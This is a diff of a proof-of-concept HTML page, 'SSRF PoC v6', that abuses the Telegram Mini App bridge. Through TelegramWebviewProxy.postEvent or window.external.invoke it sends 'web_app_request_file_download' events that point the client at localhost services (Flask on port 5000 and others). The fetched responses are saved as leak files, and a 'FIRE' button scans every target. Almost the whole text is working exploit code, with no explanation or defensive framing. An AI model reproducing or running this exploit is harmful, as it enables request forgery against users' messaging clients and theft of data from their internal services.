@@ -1,23 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>SSRF PoC v5</title>
+<head><meta charset="utf-8"><title>SSRF PoC v6</title>
 <style>
 body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
-h2{color:#f44;margin:0 0 4px 0}
+h2{color:#0f0;margin:0 0 4px 0}
 #log{background:#111;padding:6px;max-height:260px;overflow:auto;white-space:pre-wrap;font:11px monospace}
 button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
 button.fire{background:#4a0000;border-color:#f44;font-size:13px}
+.green{color:#0f0}
 </style></head><body>
-<h2>SSRF PoC v5 — TW.postEvent bridge</h2>
+<h2>SSRF PoC v6 — TelegramWebviewProxy</h2>
 <div id="log">Init...</div>
 <div id="btns"></div>
 
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-const L = (s) => { const e=document.getElementById('log'); e.textContent += s+'\n'; e.scrollTop = e.scrollHeight; };
-const TW = Telegram.WebApp;
-TW.ready(); TW.expand();
-L(`WebApp v${TW.version} | postEvent=${typeof TW.postEvent} | requestFileDownload=${typeof TW.requestFileDownload}`);
+const L = (s,c) => { const e=document.getElementById('log'); e.innerHTML += `<span class="${c||''}">${s}</span>\n`; e.scrollTop = e.scrollHeight; };
+
+L('Checking bridge...','green');
 
 const T = [
   ['http://127.0.0.1:5000/', 'flask_leak.json', 'Flask (:5000)'],
@@ -27,27 +26,37 @@ const T = [
   ['http://127.0.0.1:9999/ssrf_capture', 'capture.json', 'Monitor (:9999)'],
 ];
 
-const fire = (url, name) => {
-  L(`TX: ${url}`);
-  if (typeof TW.requestFileDownload === 'function') {
-    TW.requestFileDownload({url, file_name: name});
-  } else if (typeof TW.postEvent === 'function') {
-    TW.postEvent('web_app_request_file_download', '', {url, file_name: name});
+const proxy = window.TelegramWebviewProxy;
+if (proxy && typeof proxy.postEvent === 'function') {
+  L('TelegramWebviewProxy OK!','green');
+} else {
+  L('TelegramWebviewProxy NOT FOUND','err');
+  L('Fallback: checking window.external...');
+}
+
+const send = (cmd, data) => {
+  L(`TX: ${cmd} ${JSON.stringify(data)}`);
+  if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) {
+    window.TelegramWebviewProxy.postEvent(cmd, data);
+  } else if (window.external && window.external.invoke) {
+    window.external.invoke(JSON.stringify([cmd, data]));
   } else {
-    window.parent.postMessage(JSON.stringify(['web_app_request_file_download', {url, file_name: name}]), '*');
+    L('ERROR: no bridge available!');
   }
 };
 
 let idx = 0;
 function fireAll() { idx=0; next(); }
 function next() {
-  if (idx>=T.length) { L('=== DONE === Check http://127.0.0.1:9999'); return; }
-  const [u,n,d]=T[idx]; L(`[${++idx}/${T.length}] ${d}`); fire(u,n); setTimeout(next,3000);
+  if (idx>=T.length) { L('=== DONE === Check http://127.0.0.1:9999','green'); return; }
+  const [u,n,d]=T[idx]; L(`[${++idx}/${T.length}] ${d}`);
+  send('web_app_request_file_download', {url:u, file_name:n});
+  setTimeout(next, 2500);
 }
 
 document.getElementById('btns').innerHTML = `
-  <button class="fire" onclick="fireAll()">FIRE: Scan All 5</button>
-  ${T.map(([u,n,d],i)=>`<button onclick="fire('${u}','${n}');L('Single: ${d}')">${d}</button>`).join('')}
+  <button class="fire" onclick="fireAll()">FIRE: Scan All 5 Services</button>
+  ${T.map(([u,n,d],i) => `<button onclick="send('web_app_request_file_download',{url:'${u}',file_name:'${n}'})">${d}</button>`).join('')}
 `;
 </script>
 </body>
